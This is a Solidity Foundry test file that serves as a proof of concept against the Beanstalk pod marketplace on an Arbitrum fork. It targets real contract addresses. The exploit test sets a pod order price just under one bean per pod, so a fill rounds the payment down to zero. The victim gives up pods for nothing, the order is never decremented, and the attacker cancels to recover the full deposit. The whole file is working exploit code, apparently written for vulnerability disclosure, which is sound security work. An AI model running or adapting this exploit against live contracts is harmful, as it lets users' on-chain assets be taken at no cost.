// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// forge test --match-contract FillPodOrder_ZeroBeans --fork-url https://arb1.arbitrum.io/rpc -vv

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IBeanstalk {
    enum To   { EXTERNAL, INTERNAL, EXTERNAL_OR_INTERNAL, INTERNAL_TOLERANT }
    enum From { EXTERNAL, INTERNAL, EXTERNAL_OR_INTERNAL, EXTERNAL_TOLERANT }
    struct PodOrder {
        address orderer;
        uint256 fieldId;
        uint24  pricePerPod;
        uint256 maxPlaceInLine;
        uint256 minFillAmount;
    }
    function createPodOrder(PodOrder calldata, uint256, From) external payable returns (bytes32);
    function fillPodOrder(PodOrder calldata, uint256, uint256, uint256, To) external payable;
    function cancelPodOrder(PodOrder calldata, To) external payable;
    function getPodOrder(bytes32) external view returns (uint256);
    function getOrderId(PodOrder calldata) external pure returns (bytes32);
    function plot(address, uint256, uint256) external view returns (uint256);
    function totalHarvestable(uint256) external view returns (uint256);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

contract FillPodOrder_ZeroBeans is Test {
    IBeanstalk bs   = IBeanstalk(0xD1A0060ba708BC4BCD3DA6C37EFa8deDF015FB70);
    IERC20     bean = IERC20(0xBEA0005B8599265D41256905A9B3073D397812E4);

    address constant ATTACKER  = 0x2E5120b6aAb3742E3A9c8dCE46e79192bbee3Bf3;
    address constant VICTIM    = 0x5b45b0A5C1e3D570282bDdfe01B0465c1b332430;
    uint256 constant PLOT_IDX  = 980_532_104_448_065;
    uint256 constant PLOT_SIZE = 2_028_637_197;
    uint256 constant DEPOSIT   = 1e6;

    function setUp() public {
        vm.createSelectFork("https://arb1.arbitrum.io/rpc");
        assertGe(bean.balanceOf(ATTACKER), DEPOSIT);
        assertEq(bs.plot(VICTIM, 0, PLOT_IDX), PLOT_SIZE);
        assertGt(PLOT_IDX, bs.totalHarvestable(0));
    }

    // pricePerPod=1_000_000 → costInBeans=1 → correct payment
    function test_control_fairFill() public {
        IBeanstalk.PodOrder memory o = IBeanstalk.PodOrder(ATTACKER, 0, 1_000_000, type(uint256).max, 1);
        vm.startPrank(ATTACKER);
        bean.approve(address(bs), DEPOSIT);
        bs.createPodOrder(o, DEPOSIT, IBeanstalk.From.EXTERNAL);
        vm.stopPrank();

        uint256 vBefore = bean.balanceOf(VICTIM);
        vm.prank(VICTIM);
        bs.fillPodOrder(o, PLOT_IDX, 0, 1, IBeanstalk.To.EXTERNAL);

        assertEq(bean.balanceOf(VICTIM) - vBefore, 1, "victim received 1 bean");
        assertLt(bs.getPodOrder(bs.getOrderId(o)), DEPOSIT, "order decremented");
        console.log("[CONTROL] beans received:", bean.balanceOf(VICTIM) - vBefore);
    }

    // pricePerPod=999_999 → (1*999999)/1e6=0 → victim receives 0 beans, order never decremented
    function test_exploit_zeroBeanFill() public {
        IBeanstalk.PodOrder memory o = IBeanstalk.PodOrder(ATTACKER, 0, 999_999, type(uint256).max, 1);
        vm.startPrank(ATTACKER);
        bean.approve(address(bs), DEPOSIT);
        bs.createPodOrder(o, DEPOSIT, IBeanstalk.From.EXTERNAL);
        vm.stopPrank();

        bytes32 id = bs.getOrderId(o);
        uint256 vBefore = bean.balanceOf(VICTIM);

        vm.prank(VICTIM);
        bs.fillPodOrder(o, PLOT_IDX, 0, 1, IBeanstalk.To.EXTERNAL);

        assertEq(bean.balanceOf(VICTIM) - vBefore, 0, "victim got 0 beans");
        assertEq(bs.getPodOrder(id), DEPOSIT, "order NOT decremented after fill #1");
        console.log("[EXPLOIT] fill#1 beans received:", bean.balanceOf(VICTIM) - vBefore);
        console.log("[EXPLOIT] order remaining:", bs.getPodOrder(id));

        vm.prank(VICTIM);
        bs.fillPodOrder(o, PLOT_IDX + 1, 0, 1, IBeanstalk.To.EXTERNAL);
        assertEq(bs.getPodOrder(id), DEPOSIT, "order NOT decremented after fill #2");
        console.log("[EXPLOIT] fill#2 order remaining:", bs.getPodOrder(id));

        uint256 aBefore = bean.balanceOf(ATTACKER);
        vm.prank(ATTACKER);
        bs.cancelPodOrder(o, IBeanstalk.To.EXTERNAL);
        assertEq(bean.balanceOf(ATTACKER) - aBefore, DEPOSIT, "attacker recovered deposit");
        console.log("[EXPLOIT] attacker net cost: 0 BEAN");
    }
}
